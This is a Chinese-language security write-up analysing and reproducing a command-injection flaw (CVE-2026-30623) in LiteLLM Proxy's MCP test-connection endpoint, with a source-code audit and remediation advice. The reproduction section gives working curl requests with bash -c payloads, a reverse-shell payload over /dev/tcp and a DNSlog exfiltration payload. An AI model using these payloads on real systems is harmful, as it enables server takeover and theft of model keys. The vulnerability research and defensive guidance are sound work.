CVE-2026-30623 漏洞分析：LiteLLM Proxy MCP 接口命令注入漏洞复现与源码审计

AI 导读

LiteLLM Proxy 的 MCP 测试连接接口存在命令注入漏洞 CVE-2026-30623。携带有效 Bearer API Key 后，攻击者可控制 stdio 配置中的 command 与 args，以 bash -c 执行任意系统命令；未携带 API Key 时返回 401，数据库未连接也不影响该接口触发。

值得关注

文章从参数流转、子进程调用与接口分支还原利用条件，并区分鉴权、权限和数据库状态对复现的影响。

正文

摘要：

本文针对 LiteLLM Proxy 中 MCP（Model Context Protocol）相关接口存在的命令注入漏洞（CVE-2026-30623）进行完整源码审计、漏洞原理拆解、本地复现、风险评估与修复方案梳理。该漏洞成因是 /mcp-rest/test/connection 接口在接收 stdio 类型 MCP Server 配置时，未对传入的 command 、 args 参数做任何过滤与安全校验，直接将用户可控参数拼接后交给子进程执行，在攻击者持有合法 API Key 的前提下，可实现任意系统命令执行（RCE）。本文从环境搭建、漏洞触发链路、Python 源码逐行审计、Payload 构造、边界场景、防御建议等维度完整复盘，适合红队研究者、SOC 安全工程师、AI 应用安全从业者阅读。

前言

随着大模型应用生态快速发展，MCP（Model Context Protocol）协议正在成为 LLM 连接外部工具、本地服务、数据库的标准协议。LiteLLM 作为一款被广泛使用的 LLM 代理网关，支持对接数十种大模型厂商，同时内置了 MCP Server 管理能力，允许用户在网关内注册、测试、管理基于 stdio / http 传输模式的 MCP 服务。

stdio 模式的 MCP 服务本质是网关本地拉起一个子进程，通过标准输入输出和 MCP 服务通信，这一设计天然存在命令执行的攻击面：如果网关没有严格校验传入的启动命令参数，攻击者就可以控制子进程执行任意系统指令。本次我们审计发现的 CVE-2026-30623 正是这一类典型的 AI 网关应用命令注入漏洞。

在漏洞复现过程中我们发现：漏洞接口需要携带合法的 Bearer API Key 鉴权，未授权用户无法直接触发；但一旦拿到有效 API Key，即可无限制执行系统命令，直接接管 LiteLLM Proxy 所在服务器。对于企业侧部署的 LiteLLM 代理服务，若 API Key 泄露、权限管控宽松，攻击者可利用该漏洞横向移动、窃取模型密钥、读取服务器敏感配置、植入后门，风险等级为高危。

本文将按照「环境准备 → 漏洞复现流程 → 源码链路审计 → 漏洞根因分析 → 攻击面拓展与边界测试 → 修复方案与安全加固 → 总结思考」的结构展开，完整记录从 POC 验证到代码溯源的全过程。

1. 环境准备

1.1 靶场环境

  • 操作系统：Ubuntu 22.04 LTS

  • 靶标程序：LiteLLM Proxy（存在漏洞版本）

  • 运行时：Python 3.10+，uvicorn ASGI 服务

  • 数据库：Prisma（PostgreSQL / SQLite，本次复现中数据库报错不影响漏洞触发，对应第一张截图 Database not connected ）

  • 监听地址： 127.0.0.1:4000

说明：LiteLLM Proxy 启动时需要数据库存储 MCP Server 配置记录，第一张截图中访问 /v1/mcp/server 返回 500 Database not connected ，是因为数据库未初始化或未连接；但漏洞接口 /mcp-rest/test/connection 并不强依赖数据库写入，鉴权通过后会直接拉起子进程，因此即使数据库报错，RCE 仍然可以成功触发，这是本漏洞一个很有意思的特点。

1.2 依赖与启动

部署 LiteLLM Proxy 漏洞版本，安装依赖后启动服务：

litellm --config config.yaml --port 4000

配置文件内开启 MCP 功能，同时配置测试用 admin api key： sk-litellm-lab-0001 ，该密钥用于接口鉴权，对应复现 payload 里的 Authorization: Bearer sk-litellm-lab-0001 。

1.3 工具准备

  • curl：用于构造 HTTP 请求，验证接口

  • python debugger：源码断点调试，跟踪参数流转

  • strace（可选）：跟踪子进程创建，验证 exec 调用

2. 漏洞复现完整流程

2.1 第一步：未携带 API Key，接口返回 401 鉴权失败

首先直接请求漏洞接口，不携带 Authorization 头，验证接口鉴权逻辑。

curl -i -s -X POST http://127.0.0.1:4000/mcp-rest/test/connection \
-H 'Content-Type: application/json' \
-d '{"server_id":"probe","server_name":"probe","transport":"stdio","command":"id","args":["-c","id"]}'

响应包：

HTTP/1.1 401 Unauthorized
{"error":{"message":"Authentication Error, No api key passed in.","type":"auth_error","param":"None","code":"401"}}

这一步验证了接口的前置校验：漏洞接口存在鉴权，无 API Key 无法利用，不是未授权 RCE。这一点在漏洞定级、风险评估中非常关键，很多同类文章容易忽略鉴权前置条件。

2.2 第二步：携带合法 Bearer Token，构造 RCE Payload

构造 payload，transport 指定为 stdio ，command 设置为 bash ，args 传入 -c 拼接我们的执行命令，把 id、hostname、whoami 输出写入 /tmp 下的证明文件，增加 sleep 3 秒用于时间盲注判断（也可以替换成反弹 shell、外带 DNS 日志等 payload）。

PAYLOAD='{"server_id":"poc-001","server_name":"poc-001","transport":"stdio","command":"bash","args":["-c","id > /tmp/cve-2026-30623_proof.txt 2>&1; hostname >> /tmp/cve-2026-30623_proof.txt; whoami >> /tmp/cve-2026-30623_proof.txt; sleep 3"]}'

curl -i -s -o logs/s4_resp.txt -w '\n[elapsed] %{time_total}s\n' \
-X POST http://127.0.0.1:4000/mcp-rest/test/connection \
-H 'Content-Type: application/json' \
-H 'Authorization: Bearer sk-litellm-lab-0001' \
-d "$PAYLOAD"

请求执行后，耗时约 3.05s，和 payload 内 sleep 3 完全匹配，证明命令已经被服务端执行。

2.3 验证执行结果

读取落地文件，确认命令执行成功：

cat /tmp/cve-2026-30623_proof.txt

输出：

uid=1000(sec) gid=1000(sec) groups=1000(sec),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lxd),136(sambashare)
sec-virtual-machine
sec

文件属主为 sec ，和 LiteLLM Proxy 进程运行用户一致，RCE 验证成功。

拓展 payload 示例：反弹 shell（注意靶机环境限制）

{"server_id":"poc-revshell","server_name":"poc-revshell","transport":"stdio","command":"bash","args":["-c","bash -i >& /dev/tcp/192.168.1.100/9999 0>&1"]}

外带日志盲注 payload：

{"server_id":"dnslog","server_name":"dnslog","transport":"stdio","command":"curl","args":["http://xxx.dnslog.cn/`whoami`"]}

2.4 补充：数据库报错接口 /v1/mcp/server 说明

第一张截图中请求 /v1/mcp/server 返回 500 Database not connected ，这个接口是新增/持久化存储 MCP Server 配置到数据库的接口，和本次漏洞 /mcp-rest/test/connection 不是同一个接口。

  • /v1/mcp/server ：写入数据库，依赖 prisma 数据库连接；数据库离线直接报错，无法完成新增。

  • /mcp-rest/test/connection ：测试连接接口，逻辑是「临时拉起 stdio 子进程测试连通性」，不需要持久化写入数据库，仅鉴权后直接执行命令，所以哪怕数据库挂掉，漏洞依然可以触发。
    这是本漏洞非常关键的区分点，审计的时候很容易混淆两个 MCP 接口。

3. 源码审计：漏洞完整调用链路追踪

接下来我们结合截图里的代码片段，自上而下梳理完整参数流转链路，这也是文章的核心审计部分。

3.1 数据模型：Stdio-specific fields 定义

# Stdio-specific fields
command: Optional[str] = None
args: List[str] = Field(default_factory=list)
env: Dict[str, str] = Field(default_factory=dict)

这是 NewMCPServerRequest 结构体里 stdio 传输模式的字段定义。

  • command ：字符串类型，代表要启动的程序；

  • args ：字符串列表，程序参数；

  • env ：环境变量字典。
    这个模型直接接收前端 JSON 里用户可控的三个字段，模型层没有任何正则、黑名单、白名单校验，原始输入直接存入 payload 对象。

攻击者可以完全自由控制 command、args，这是攻击面的源头。

3.2 路由入口： add_mcp_server 接口函数

async def add_mcp_server(
    payload: NewMCPServerRequest,
):

/mcp-rest/test/connection 路由绑定到该处理函数，HTTP json body 自动反序列化为 NewMCPServerRequest 对象 payload。

这里注意：该函数内部分支逻辑：
分支A：持久化保存 MCP Server 记录到数据库（调用 update_mcp_server ，对应 /v1/mcp/server 逻辑，依赖 prisma）
分支B：test connection 测试逻辑，不走数据库写入，直接使用 payload 内的 stdio 参数构造子进程启动参数，也就是我们漏洞触发的分支。

3.3 数据库更新逻辑（仅作对比，非漏洞分支）

  
mcp_server_record_updated = await update_mcp_server(
    prisma_client,
    payload,
    touched_by=user_api_key_dict.user_id or LITELLM_PROXY_ADMIN_NAME,
)

这一段是持久化分支，把 payload 存入数据库，数据库未连接时这里抛出异常，对应第一张截图的 500。漏洞利用的测试连接分支不会走到这一段。

3.4 参数提取：直接读取 payload 可控字段

command=payload.command,
args=payload.args,
env=payload.env,

代码直接把 http 请求传入的 payload.command 、 payload.args 、 payload.env 原样取出，没有任何过滤、转义、白名单校验。用户输入是什么，这里拿到的值就是什么。
这是漏洞的核心中转点：用户可控输入无净化直接向下传递到进程启动代码。

3.5 构造 StdioServerParameters 并调用 stdio_client 拉起子进程

  
server_params = StdioServerParameters(
    command=self.stdio_config.get("command", ""),
    args=self.stdio_config.get("args", []),
    env=self.stdio_config.get("env", {}),
)
return stdio_client(server_params), None

在测试连接的分支里，代码把从 payload 拿到的 command、args、env 组装成 StdioServerParameters 对象，传入 stdio_client 函数。
stdio_client 底层是 MCP SDK 内置的子进程创建逻辑，内部调用 subprocess.Popen ，传入 command + args 列表执行：

# MCP SDK 底层伪代码
process = subprocess.Popen(
    [command, *args],
    env=full_env,
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE
)

很多人会误以为列表传参 [cmd, arg1, arg2] 天然安全，不会注入，但是这里攻击者直接控制第一个元素 command。
常规注入： command="ls", args=[";id"] 这种写法在列表模式下不会注入；
但是本漏洞场景：攻击者直接把 command 设置为 bash ，args 里放 ["-c", "任意命令"] ，bash -c 会把后面整个字符串作为 shell 脚本解析，此时就获得了完整 shell 解析能力，实现任意命令注入。
这是本漏洞最容易踩坑的原理误区，必须重点讲清楚。

3.6 漏洞根因总结

  1. 业务设计上， stdio 模式本意是让管理员配置可信的 MCP 服务启动命令，设计预期是内部可信配置，没有考虑参数来自外部 HTTP 可控输入；

  2. /mcp-rest/test/connection 测试接口将 HTTP 传入的 command 、 args 完全信任，无白名单、无黑名单、无输入校验；

  3. 攻击者可控 command=bash ，配合 args=["-c", "payload"] ，借助 bash -c 的 shell 解析能力，绕过列表传参的注入防护；

  4. 鉴权仅校验 API Key 是否存在，没有对 API Key 的权限做精细化控制：普通具备 MCP 配置权限的 key 即可触发 RCE；

  5. 测试连接分支独立于数据库写入分支，数据库离线不阻断命令执行，降低了利用门槛。

一句话根因：LiteLLM Proxy MCP 测试连接接口，允许持有合法 API Key 的用户指定任意 stdio 启动命令，通过 bash -c 构造实现任意命令执行。

4. 攻击面拓展、边界场景与风险推演

4.1 权限边界

  • 攻击前置条件：有效 LiteLLM API Key（具备 MCP 服务管理权限）；

  • 执行权限：LiteLLM Proxy 服务进程的运行用户权限；

  • 权限影响：

  • 读取服务器上所有 LLM api key、配置文件；

  • 在服务器植入后门、持久化；

  • 读取环境变量，窃取模型厂商密钥；

  • 对内网横向扫描，攻击内网其他服务；

  • 如果服务以 root 运行，直接服务器接管。

4.2 绕过思路与拓展 Payload

  1. 不使用 bash，使用 sh、python、perl 等解释器执行代码

{"transport":"stdio","command":"sh","args":["-c","whoami"]}

  1. 上传文件、写入 webshell

{"transport":"stdio","command":"echo","args":["xxx",">","/tmp/test.txt"]}

  1. 时间盲注、DNSlog 外带，无回显场景利用

该接口本身不会返回命令执行结果，只会返回 MCP 连接状态，所以默认是无回显 RCE，我们复现使用写文件、sleep 是盲注验证手段。

4.3 误判点澄清

  • ❌ 误区1：subprocess 列表传参不会注入 → 正确：列表传参只是阻止 shell 元字符注入，但是如果第一个参数本身就是 shell 解释器（bash/sh/python），并且参数交给解释器解析脚本，注入依然成立；

  • ❌ 误区2：数据库离线漏洞无法利用 → 正确：测试连接分支不走数据库，数据库报错不影响 RCE；

  • ❌ 误区3：这是未授权漏洞 → 正确：必须携带合法 API Key，属于权限内命令注入，不是未授权。

4.4 真实业务场景风险

很多企业部署 LiteLLM 作为内部大模型网关，会给开发、测试人员分发 API Key，开启 MCP 能力对接内部工具。如果没有限制 MCP 服务配置权限，拿到 key 的内部人员、或者泄露 key 的外部攻击者，就可以直接拿下网关服务器。
同时很多 LiteLLM 部署在公网，API Key 硬编码在客户端、前端、日志中，泄露风险极高。

5. 修复方案与安全加固建议

5.1 官方补丁修复方向（源码层面）

  1. 增加命令白名单机制（推荐）
    stdio 模式 MCP 服务是预定义可信工具，不允许用户自由填写 command。只允许选择预先配置好的 MCP 服务名称，后端映射固定 command 和 args，用户无法自定义启动命令。

本质设计修改：把「用户输入命令」改成「用户选择预设服务」，从源头消除攻击面。

  1. 输入严格校验：禁止用户传入 bash / sh / python / perl 这类解释器作为 command
    如果业务必须支持自定义 command，增加黑名单拦截 shell 解释器，禁止 -c 、 -e 等执行脚本的参数；

黑名单属于弱防护，容易被绕过，优先白名单。

  1. 权限分离：MCP 测试/新增接口单独权限管控
    API Key 增加细粒度权限 scope：区分 chat 、 mcp:read 、 mcp:write ，普通对话 key 禁止调用 MCP 服务配置接口，只有管理员专属 key 才允许操作 MCP。

  2. 子进程沙箱隔离
    对 stdio 拉起的子进程使用 cgroup、namespaces、seccomp 限制，禁止子进程网络出站、文件读写、fork 新进程，降低 RCE 后的危害。

5.2 运维侧临时缓解方案（补丁前应急）

  1. 关闭 MCP 功能，在配置文件中禁用 MCP 相关路由；

  2. 收紧 API Key，回收所有非管理员 Key 的 MCP 相关权限；

  3. 防火墙限制 LiteLLM 服务器出站，禁止主动向外发起连接；

  4. 审计日志：监控 /mcp-rest/test/connection 接口访问日志，重点检测 command 为 bash/sh/python 的请求；

  5. 升级 LiteLLM 到已修复版本。

5.3 开发规范建议

在 AI 网关、MCP 代理类应用开发中，stdio 子进程启动属于高危操作，遵循以下原则：

  • 永远不要将外部用户可控输入直接作为子进程启动命令；

  • stdio 模式优先采用预注册、固定配置模式；

  • 任何拉起子进程的接口，都必须做最小权限、最小参数校验；

  • 区分「配置持久化接口」和「测试连接接口」，测试接口的风险往往更容易被忽略。

6. 总结与思考

CVE-2026-30623 是一个典型的 AI 大模型网关应用安全漏洞，它和传统 Web 命令注入漏洞既有共性，又有属于 AI 生态的独特性。
传统命令注入大多是开发者拼接字符串交给 shell 执行；而这个漏洞利用了 MCP stdio 协议本身的设计特性：协议原生支持启动本地子进程，开发者误将「管理员可信配置入口」开放给携带 API Key 的普通用户，同时没有限制可执行的程序，最终形成 RCE。

随着 MCP 协议快速普及，未来会有大量 LLM 代理、AI Agent 平台接入 stdio 类型 MCP 服务，同类漏洞会持续出现。很多开发者会默认 subprocess 列表传参是安全的，忽略了攻击者可以直接指定 shell 解释器这一攻击路径，这是后续 AI 安全审计需要重点关注的一类攻击范式。

从防御视角来看，AI 应用的安全不能只依赖鉴权，鉴权只是第一道防线，业务接口本身的输入校验、权限粒度、危险操作的最小化隔离缺一不可。哪怕用户已经持有合法 token，也不应该赋予其任意执行服务器系统命令的能力。

本次审计也给我们红队测试带来启发：在做 LLM 代理、AI Agent 渗透测试时，除了常规的 prompt 注入、模型泄露，需要重点关注 MCP、工具调用、本地子进程拉起相关接口，这类接口往往隐藏着高风险的命令执行入口，并且很多文档不会标注这类接口的存在。
